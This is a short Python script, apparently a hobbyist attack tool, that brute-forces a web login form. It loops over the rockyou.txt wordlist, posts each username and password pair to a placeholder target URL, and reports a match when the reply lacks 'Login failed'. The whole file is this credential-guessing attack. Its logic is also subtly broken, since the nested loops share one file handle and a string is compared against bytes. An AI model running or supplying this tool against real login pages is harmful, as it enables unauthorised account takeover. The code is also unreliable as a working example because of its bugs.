
import requests


target_url = "website/ip"
data_dict = {"username": "", "password": "", "Login": "submit"}

try:
    total = 0
    with open ("/root/Desktop/rockyou.txt", "r") as word_list:
        for username in word_list:
            word_u = username.strip()
            print("Username: " + word_u)
            for password in word_list:
                word_p = password.strip()
                print("[" + word_u + "] Password: " + word_p)
                data_dict["username"] = word_u
                data_dict["password"] = word_p
                response = requests.post(target_url, data=data_dict)
                if "Login failed" not in response.content:
                    print("[+] Correct Login :" + "\n Username: " + word_u + "\n Password: " + word_p)
                    exit()

    print("[-] Password not found.")
except KeyboardInterrupt:
    print("[-] Quitting...")